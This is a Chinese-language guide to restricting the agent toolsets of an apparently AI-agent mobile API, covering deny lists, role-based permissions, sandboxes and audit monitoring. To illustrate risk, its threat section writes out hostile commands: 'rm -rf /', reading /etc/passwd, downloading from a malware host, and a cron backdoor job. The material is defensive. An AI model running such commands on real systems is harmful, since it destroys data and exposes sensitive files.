# 移动 API 安全工具集配置指南

> **工具集安全** 是移动 API 服务的核心安全机制，通过排除危险工具确保服务安全性。

---

## 📋 目录

- [配置项详解](#配置项详解)
- [为什么需要工具集限制](#为什么需要工具集限制)
- [危险工具清单](#危险工具清单)
- [安全工具推荐](#安全工具推荐)
- [工具集配置方案](#工具集配置方案)
- [权限控制](#权限控制)
- [沙箱环境](#沙箱环境)
- [审计与监控](#审计与监控)

---

## 配置项详解

### 1. `enabled_toolsets: Optional[List[str]] = None`

**作用：** 启用的工具集列表（白名单）

```python
# None: 使用默认配置（推荐）
enabled_toolsets = None

# 明确指定启用的工具集
enabled_toolsets = ["web", "file", "code_execution", "vision"]

# 最小化配置（只读工具）
enabled_toolsets = ["web_search", "read_file"]
```

**配置说明：**
- `None` 表示使用系统默认配置
- 明确列表表示只允许指定的工具集
- 未列出的工具集将被完全禁用

---

### 2. `disabled_toolsets: List[str] = ["messaging", "homeassistant", "cron"]`

**作用：** 禁用的工具集列表（黑名单）

```python
# 基础禁用（移动 API 安全）
disabled_toolsets = ["messaging", "homeassistant", "cron"]

# 增强禁用（排除更多危险工具）
disabled_toolsets = [
    "messaging",      # 消息发送
    "homeassistant",  # 智能家居
    "cron",          # 计划任务
    "terminal",      # 终端命令
    "browser",       # 浏览器自动化
    "process",       # 进程管理
]

# 空列表表示不禁用任何工具集（不推荐）
disabled_toolsets = []
```

**配置说明：**
- 列出的工具集将被完全禁用
- 即使工具在 enabled_toolsets 中，如果在 disabled_toolsets 中也会被排除
- disabled_toolsets 优先级高于 enabled_toolsets

---

## 为什么需要工具集限制

### ❌ 危险工具的风险

#### 风险 1: 终端命令执行

```python
# terminal 工具可以执行任意系统命令
terminal("rm -rf /")           # 删除所有文件
terminal("cat /etc/passwd")    # 读取敏感信息
terminal("wget malware.com")   # 下载恶意软件
```

**潜在危害：**
- 🔥 删除服务器文件
- 🔐 窃取敏感数据
- 💀 安装后门程序
- 🚫 完全控制系统

---

#### 风险 2: 浏览器自动化

```python
# browser 工具可以控制浏览器
browser_navigate("phishing.com")  # 访问钓鱼网站
browser_click("transfer-button")  # 点击转账按钮
browser_type("password")          # 输入密码
```

**潜在危害：**
- 🎣 钓鱼攻击
- 💰 未授权转账
- 🔑 凭证窃取
- 🕵️ 隐私泄露

---

#### 风险 3: 进程管理

```python
# process 工具可以管理系统进程
process_start("bitcoin-miner")    # 启动挖矿程序
process_kill("security-daemon")   # 杀死安全进程
```

**潜在危害：**
- ⛏️ 资源滥用
- 🛡️ 绕过安全防护
- 💣 系统不稳定

---

#### 风险 4: 消息发送

```python
# messaging 工具可以发送消息
send_message("spam", "+8613800000000")  # 发送垃圾短信
send_email("phishing", "user@example.com")  # 发送钓鱼邮件
```

**潜在危害：**
- 📨 垃圾信息骚扰
- 🎣 钓鱼邮件诈骗
- 💬 冒充用户身份

---

#### 风险 5: 计划任务

```python
# cron 工具可以创建定时任务
cronjob_add("* * * * *", "backdoor.sh")  # 每分钟执行后门
```

**潜在危害：**
- 🔄 持久化后门
- ⏰ 定时攻击
- 🔁 难以清除

---

### ✅ 工具集限制的好处

#### 好处 1: 攻击面最小化

```
可用工具：web_search, read_file, write_file
攻击面：小 ✓

可用工具：terminal, browser, process, messaging
攻击面：大 ✗
```

---

#### 好处 2: 权限隔离

```
移动 API 用户：只能使用安全工具
管理员：可以使用所有工具

实现权限分级，降低风险
```

---

#### 好处 3: 合规要求

```
GDPR: 数据保护
SOC2: 访问控制
ISO27001: 信息安全

工具集限制帮助满足合规要求
```

---

## 危险工具清单

### 🔴 高危工具（必须禁用）

| 工具集 | 工具名称 | 风险等级 | 潜在危害 |
|--------|---------|---------|---------|
| **terminal** | terminal | 🔴 极高 | 任意命令执行、系统控制 |
| **process** | process_start, process_kill, process_list | 🔴 极高 | 进程管理、资源滥用 |
| **browser** | browser_navigate, browser_click, browser_type | 🔴 高 | 钓鱼攻击、凭证窃取 |
| **messaging** | send_message, send_email | 🔴 高 | 垃圾信息、钓鱼诈骗 |
| **cron** | cronjob_add, cronjob_remove | 🔴 高 | 持久化后门、定时攻击 |

---

### 🟠 中危工具（谨慎启用）

| 工具集 | 工具名称 | 风险等级 | 潜在危害 |
|--------|---------|---------|---------|
| **file** | write_file, delete_file | 🟠 中 | 文件篡改、数据删除 |
| **code_execution** | execute_code | 🟠 中 | 代码注入、资源消耗 |
| **homeassistant** | ha_call_service | 🟠 中 | 设备控制、隐私泄露 |
| **delegate** | delegate_task | 🟠 中 | 权限提升、代理攻击 |

---

### 🟢 低危工具（相对安全）

| 工具集 | 工具名称 | 风险等级 | 说明 |
|--------|---------|---------|------|
| **web** | web_search, web_extract | 🟢 低 | 只读操作 |
| **file** | read_file, search_files | 🟢 低 | 只读操作 |
| **vision** | vision_analyze | 🟢 低 | 图像分析 |
| **planning** | todo, memory | 🟢 低 | 任务管理 |

---

## 安全工具推荐

### ✅ 移动 API 推荐工具集

#### 1. Web 研究工具

```python
enabled_toolsets = ["web"]

# 可用工具
- web_search: 搜索网络信息
- web_extract: 提取网页内容

# 使用示例
POST /api/v1/chat/completions
{
    "message": "搜索最新的 Python 新闻",
    "toolsets": ["web"]
}
```

**安全性：** ✅ 只读操作，无风险

---

#### 2. 文件操作工具（沙箱）

```python
enabled_toolsets = ["file"]

# 可用工具
- read_file: 读取文件
- write_file: 写入文件
- patch: 修改文件
- search_files: 搜索文件

# 安全配置
file_sandbox = "/tmp/hermes-sandbox"  # 限制操作范围
```

**安全性：** ⚠️ 需要沙箱隔离

---

#### 3. 代码执行工具（沙箱）

```python
enabled_toolsets = ["code_execution"]

# 可用工具
- execute_code: 执行 Python 代码

# 安全配置
code_execution_sandbox = "modal"  # 使用 Modal 沙箱
code_execution_timeout = 60       # 60 秒超时
code_execution_memory_limit = 512 # 512MB 内存限制
```

**安全性：** ⚠️ 必须使用沙箱

---

#### 4. 视觉分析工具

```python
enabled_toolsets = ["vision"]

# 可用工具
- vision_analyze: 分析图像内容

# 使用示例
POST /api/v1/chat/completions
{
    "message": "分析这张图片",
    "toolsets": ["vision"],
    "images": ["base64_encoded_image"]
}
```

**安全性：** ✅ 只读分析，无风险

---

#### 5. 规划与记忆工具

```python
enabled_toolsets = ["planning"]

# 可用工具
- todo: 任务管理
- memory: 长期记忆

# 使用示例
{
    "message": "帮我创建一个学习计划",
    "toolsets": ["planning"]
}
```

**安全性：** ✅ 仅内部管理，无风险

---

## 工具集配置方案

### 方案 1: 最小权限（推荐）

```python
# 只启用最安全的工具集
enabled_toolsets = ["web", "vision", "planning"]
disabled_toolsets = [
    "terminal", "process", "browser",
    "messaging", "cron", "homeassistant",
    "file", "code_execution", "delegate"
]

# 适用场景
# - 公共 API 服务
# - 未认证用户
# - 免费层用户
```

**安全等级：** ⭐⭐⭐⭐⭐

---

### 方案 2: 标准配置（平衡）

```python
# 启用常用安全工具
enabled_toolsets = ["web", "file", "vision", "planning"]
disabled_toolsets = [
    "terminal", "process", "browser",
    "messaging", "cron", "homeassistant"
]

# 文件操作限制
file_sandbox = "/tmp/hermes-sandbox"
file_max_size = 10 * 1024 * 1024  # 10MB

# 适用场景
# - 认证用户
# - 付费层用户
# - 企业内部服务
```

**安全等级：** ⭐⭐⭐⭐

---

### 方案 3: 宽松配置（信任环境）

```python
# 启用大部分工具（排除极度高危）
enabled_toolsets = [
    "web", "file", "vision", "planning",
    "code_execution", "delegate"
]
disabled_toolsets = [
    "terminal", "process", "browser",
    "messaging", "cron", "homeassistant"
]

# 代码执行沙箱
code_execution_backend = "modal"
code_execution_timeout = 120

# 适用场景
# - 管理员
# - 可信内部网络
# - 企业 VIP 用户
```

**安全等级：** ⭐⭐⭐

---

### 方案 4: 完全禁用（不推荐）

```python
# 不禁用任何工具集
enabled_toolsets = None  # 使用默认
disabled_toolsets = []

# ⚠️ 警告：这将允许所有工具，包括危险工具
# 只用于本地开发和测试

# 适用场景
# - 本地开发
# - 单机测试
# - 完全隔离环境
```

**安全等级：** ⭐（不推荐生产使用）

---

## 权限控制

### 基于角色的工具集访问

```python
# 角色定义
ROLES = {
    "anonymous": {
        "enabled_toolsets": ["web", "vision"],
        "disabled_toolsets": ["terminal", "process", "browser", "file", "code_execution"],
    },
    "user": {
        "enabled_toolsets": ["web", "file", "vision", "planning"],
        "disabled_toolsets": ["terminal", "process", "browser", "messaging", "cron"],
    },
    "pro": {
        "enabled_toolsets": ["web", "file", "vision", "planning", "code_execution"],
        "disabled_toolsets": ["terminal", "process", "browser", "messaging", "cron"],
    },
    "admin": {
        "enabled_toolsets": None,  # 所有工具
        "disabled_toolsets": [],
    },
}

# 中间件实现
class ToolsetAuthMiddleware:
    async def dispatch(self, request: Request, call_next):
        # 获取用户角色
        user_role = request.state.user_role
        
        # 应用工具集限制
        role_config = ROLES.get(user_role, ROLES["anonymous"])
        
        request.state.enabled_toolsets = role_config["enabled_toolsets"]
        request.state.disabled_toolsets = role_config["disabled_toolsets"]
        
        return await call_next(request)
```

---

### 工具集权限检查

```python
# 检查工具是否可用
def is_tool_available(tool_name: str, toolset: str, request: Request) -> bool:
    """检查工具是否对当前用户可用"""
    
    enabled = request.state.enabled_toolsets
    disabled = request.state.disabled_toolsets
    
    # 黑名单优先
    if toolset in disabled:
        return False
    
    # 白名单检查
    if enabled and toolset not in enabled:
        return False
    
    return True

# 使用示例
if not is_tool_available("terminal", "terminal", request):
    raise HTTPException(403, "工具不可用：terminal")
```

---

### 动态权限提升

```python
# 临时提升权限
async def request_elevated_permissions(
    user_id: str,
    requested_toolsets: list,
    reason: str,
) -> bool:
    """请求临时权限提升"""
    
    # 1. 记录请求
    await db.permission_requests.insert_one({
        "user_id": user_id,
        "toolsets": requested_toolsets,
        "reason": reason,
        "status": "pending",
        "created_at": datetime.now(),
    })
    
    # 2. 通知管理员
    await notify_admin(f"用户 {user_id} 请求权限提升")
    
    # 3. 等待审批
    # ...
    
    return False  # 默认拒绝

# 管理员审批
async def approve_permission_request(
    request_id: str,
    approved_by: str,
    expires_in: int,
):
    """审批权限请求"""
    
    # 1. 更新状态
    await db.permission_requests.update_one(
        {"_id": request_id},
        {"$set": {
            "status": "approved",
            "approved_by": approved_by,
            "expires_at": datetime.now() + timedelta(hours=expires_in),
        }}
    )
    
    # 2. 临时授权
    # ...
```

---

## 沙箱环境

### 文件沙箱

```python
# 限制文件操作范围
class FileSandbox:
    def __init__(self, sandbox_path: str):
        self.sandbox_path = Path(sandbox_path).resolve()
    
    def is_safe_path(self, path: str) -> bool:
        """检查路径是否在沙箱内"""
        resolved = Path(path).resolve()
        return str(resolved).startswith(str(self.sandbox_path))
    
    def read_file(self, path: str) -> str:
        """安全读取文件"""
        if not self.is_safe_path(path):
            raise PermissionError(f"禁止访问沙箱外文件：{path}")
        
        with open(path, "r") as f:
            return f.read()
    
    def write_file(self, path: str, content: str) -> None:
        """安全写入文件"""
        if not self.is_safe_path(path):
            raise PermissionError(f"禁止写入沙箱外文件：{path}")
        
        # 检查文件大小
        if len(content) > 10 * 1024 * 1024:  # 10MB
            raise ValueError("文件过大")
        
        with open(path, "w") as f:
            f.write(content)

# 使用示例
sandbox = FileSandbox("/tmp/hermes-sandbox")
sandbox.read_file("/tmp/hermes-sandbox/data.txt")  # ✅
sandbox.read_file("/etc/passwd")  # ❌ 拒绝
```

---

### 代码执行沙箱（Modal）

```python
# 使用 Modal 沙箱执行代码
from modal import Stub, Image, Volume

stub = Stub("hermes-code-execution")

sandbox_image = (
    Image.python("3.12")
    .pip_install("requests", "httpx", "beautifulsoup4")
)

@stub.function(
    image=sandbox_image,
    timeout=120,      # 2 分钟超时
    memory=512,       # 512MB 内存限制
    cpu=0.5,          # 0.5 核 CPU
)
def execute_code_sandboxed(code: str) -> dict:
    """在沙箱中执行代码"""
    
    import subprocess
    import tempfile
    
    with tempfile.TemporaryDirectory() as tmpdir:
        # 写入代码
        script_path = f"{tmpdir}/script.py"
        with open(script_path, "w") as f:
            f.write(code)
        
        # 执行
        result = subprocess.run(
            ["python", script_path],
            capture_output=True,
            text=True,
            timeout=60,
        )
        
        return {
            "success": result.returncode == 0,
            "stdout": result.stdout,
            "stderr": result.stderr,
        }

# 使用示例
result = execute_code_sandboxed.remote("print('Hello, World!')")
```

---

### 网络沙箱

```python
# 限制网络访问
import socket
from urllib.parse import urlparse

class NetworkSandbox:
    def __init__(self, allowed_domains: list):
        self.allowed_domains = allowed_domains
        self.blocked_ips = [
            "127.0.0.1",
            "10.0.0.0/8",
            "192.168.0.0/16",
            "172.16.0.0/12",
        ]
    
    def is_allowed(self, url: str) -> bool:
        """检查 URL 是否允许访问"""
        
        parsed = urlparse(url)
        domain = parsed.netloc
        
        # 检查域名白名单
        if domain not in self.allowed_domains:
            return False
        
        # 检查是否访问内网
        ip = socket.gethostbyname(domain)
        if self.is_internal_ip(ip):
            return False
        
        return True
    
    def is_internal_ip(self, ip: str) -> bool:
        """检查是否是内网 IP"""
        import ipaddress
        
        try:
            ip_obj = ipaddress.ip_address(ip)
            return ip_obj.is_private
        except:
            return True

# 使用示例
sandbox = NetworkSandbox(allowed_domains=[
    "api.example.com",
    "cdn.example.com",
])

sandbox.is_allowed("https://api.example.com/data")  # ✅
sandbox.is_allowed("http://192.168.1.1/admin")  # ❌ 拒绝
```

---

## 审计与监控

### 工具调用审计

```python
# 记录所有工具调用
async def log_tool_call(
    user_id: str,
    tool_name: str,
    toolset: str,
    args: dict,
    result: str,
    success: bool,
    duration: float,
):
    """记录工具调用"""
    
    log_entry = {
        "timestamp": datetime.now().isoformat(),
        "user_id": user_id,
        "tool_name": tool_name,
        "toolset": toolset,
        "args": args,
        "result_preview": result[:100],  # 只记录前 100 字符
        "success": success,
        "duration": duration,
        "ip_address": get_client_ip(),
    }
    
    await db.tool_logs.insert_one(log_entry)

# 使用示例
await log_tool_call(
    user_id="user_123",
    tool_name="web_search",
    toolset="web",
    args={"query": "Python news"},
    result="Search results...",
    success=True,
    duration=2.5,
)
```

---

### 异常检测

```python
# 检测异常工具使用模式
async def detect_anomalous_tool_usage(user_id: str) -> bool:
    """检测异常工具使用"""
    
    # 1. 获取最近 1 小时的工具调用
    recent_calls = await db.tool_logs.find({
        "user_id": user_id,
        "timestamp": {"$gte": datetime.now() - timedelta(hours=1)},
    }).toArray()
    
    # 2. 检查频率异常
    if len(recent_calls) > 100:  # 1 小时超过 100 次
        return True
    
    # 3. 检查失败率异常
    failed = sum(1 for call in recent_calls if not call["success"])
    if failed / len(recent_calls) > 0.5:  # 失败率超过 50%
        return True
    
    # 4. 检查敏感工具使用
    sensitive_tools = ["execute_code", "write_file", "delete_file"]
    sensitive_count = sum(
        1 for call in recent_calls
        if call["tool_name"] in sensitive_tools
    )
    if sensitive_count > 10:  # 1 小时超过 10 次敏感操作
        return True
    
    return False
```

---

### 监控指标

```python
# Prometheus 指标
TOOL_CALLS = Counter(
    "hermes_tool_calls_total",
    "工具调用总数",
    ["tool_name", "toolset", "success", "user_tier"],
)

TOOL_DURATION = Histogram(
    "hermes_tool_duration_seconds",
    "工具执行耗时",
    ["tool_name"],
    buckets=[0.1, 0.5, 1.0, 2.0, 5.0, 10.0, 30.0, 60.0],
)

DISABLED_TOOL_ATTEMPTS = Counter(
    "hermes_disabled_tool_attempts_total",
    "尝试使用禁用工具的次数",
    ["tool_name", "user_id"],
)

# 告警规则
- alert: HighDisabledToolAttempts
  expr: |
    sum(rate(hermes_disabled_tool_attempts_total[5m])) > 10
  for: 5m
  annotations:
    summary: "频繁尝试使用禁用工具"
```

---

## 配置对比表

| 配置项 | 免费层 | 付费层 | 企业层 | 管理员 |
|--------|-------|-------|-------|-------|
| `enabled_toolsets` | `["web", "vision"]` | `["web", "file", "vision"]` | `["web", "file", "code_exec"]` | `None` (全部) |
| `disabled_toolsets` | 所有危险工具 | 高危工具 | 极度高危工具 | `[]` (无) |
| 文件沙箱 | N/A | ✅ | ✅ | ❌ |
| 代码沙箱 | N/A | N/A | ✅ | ❌ |
| 网络白名单 | ✅ | ✅ | ⚠️ | ❌ |
| 审计日志 | ✅ | ✅ | ✅ | ⚠️ |

---

## 总结

### 核心要点

1. **危险工具必须禁用**：terminal、process、browser、messaging、cron
2. **文件操作需要沙箱**：限制在特定目录内
3. **代码执行需要隔离**：使用 Modal 等沙箱服务
4. **权限分级管理**：根据用户角色启用不同工具集
5. **全面审计监控**：记录所有工具调用

### 安全原则

- 🔒 **最小权限**：只启用必要的工具
- 📦 **沙箱隔离**：危险操作在隔离环境执行
- 👁️ **全面审计**：记录所有操作
- 🚨 **异常检测**：及时发现可疑行为
- 🔄 **定期审查**：评估工具集安全性

### 最佳实践

- ✅ 默认禁用所有高危工具
- ✅ 使用白名单而非黑名单
- ✅ 文件操作限制在沙箱内
- ✅ 代码执行使用远程沙箱
- ✅ 实施基于角色的权限控制
- ✅ 记录并监控所有工具调用
- ✅ 定期审查和更新工具集配置

---

**文档版本：** 1.0.0  
**最后更新：** 2024-01-XX  
**所属项目：** Hermes-Agent FastAPI 服务  
**作者：** Hermes-Agent Team
